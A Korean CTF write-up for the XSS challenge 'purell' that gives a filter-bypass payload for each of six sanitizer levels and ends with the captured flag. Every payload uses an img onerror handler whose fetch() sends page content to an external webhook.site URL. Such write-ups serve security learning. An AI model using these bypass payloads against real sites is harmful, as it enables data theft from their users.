# purell

각 santinze시키는 level들을 통과해서 XSS를 성공시키면 된다.

### 레벨 0

santinze가 없으므로 그냥 XSS 페이로드 주면 된다.

### 레벨 1

`sanitizer: (html) => html.includes('script') || html.length > 150 ? 'nuh-uh' : html`

script단어를 금지하고 150단어 제한이 걸려있는데 img태그를 사용하면 된다.

```
<img src=1 onerror="fetch('https://webhook.site/c98556af-36a8-467b-a591-28a3156927b0/?'+document.querySelector('.flag').innerText)">
```

### 레벨 2

`sanitizer: (html) => html.includes('script') || html.includes('on') || html.length > 150 ? 'nuh-uh' : html`

추가로 on을 금지한다.

그러나 HTML은 대소문자 구별이 기본적으로 없으므로 On을 사용하면 된다.

```
<img src=1 Onerror="fetch('https://webhook.site/c98556af-36a8-467b-a591-28a3156927b0/?'+document.querySelector('.flag').innerText)">
```

### 레벨 3

`sanitizer: (html) => html.toLowerCase().replaceAll('script', '').replaceAll('on', '')`

입력이 소문자로 되고 각 문자들을 ''으로 치환하고 있다.

이러면 그냥 `scscriptript` 이렇게 페이로드를 작성하므로 필터링 우회가 가능하다.

그리고 querySelector랑 innerText에서 대문자를 사용하고 있으므로 `[]`을 사용해서 아스키코드료 16진수 이스케이프를 사용하면 된다.

```
<img src=1 oonnerror="fetch('https://webhook.site/c98556af-36a8-467b-a591-28a3156927b0/?'+document['query\x53elector']('.flag')['inner\x54ext'])">
```

### 레벨 4

```
sanitizer: (html) =>
      html
        .toLowerCase().replaceAll('script', '').replaceAll('on', '')
        .replaceAll('>', '')
```

`>` 문자를 필터링하고 있는데 그냥 > 안써서 안닫으면 끝이다.

```
<img src=1 oonnerror="fetch('https://webhook.site/c98556af-36a8-467b-a591-28a3156927b0/?'+document['query\x53elector']('.flag')['inner\x54ext'])"
```

### 레벨 5

```
sanitizer: (html) =>
      html
        .toLowerCase().replaceAll('script', '').replaceAll('on', '')
        .replaceAll('>', '')
        .replace(/\s/g, '')
```

공백을 치환하고 있는데 HTML에선 공백을 단순히 `/`를 사용해서 우회 가능하다.

```
<img/oonnerror="fetch('https://webhook.site/c98556af-36a8-467b-a591-28a3156927b0/?'+document['query\x53elector']('.flag')['inner\x54ext'])"/src=1
```

### 레벨 6

```
sanitizer: (html) =>
        html
        .toLowerCase().replaceAll('script', '').replaceAll('on', '')
        .replaceAll('>', '')
        .replace(/\s/g, '')
        .replace(/[()]/g, '')
```

이젠 괄호도 필터링하고 있다.

요건 HTML 엔티티를 사용해서 `&#x28;` 이런식으로 인코딩 하면 된다.

```
<img/oonnerror="fetch&#x28;'https://webhook.site/c98556af-36a8-467b-a591-28a3156927b0/?'+document['query\x53elector']&#x28;'.flag'&#x29;['inner\x54ext']&#x29;"/src=1
```

해당 레벨들을 전부 클리어 하면 flag조각을 전부 모을 수 있다.

`FLAG : lactf{1_4m_z3_b3s7_x40ss_h4nd_g34m_4cr0ss_411_t1m3_4nd_z_un1v3rs3_1nf3c71ng_3v34y_1}`
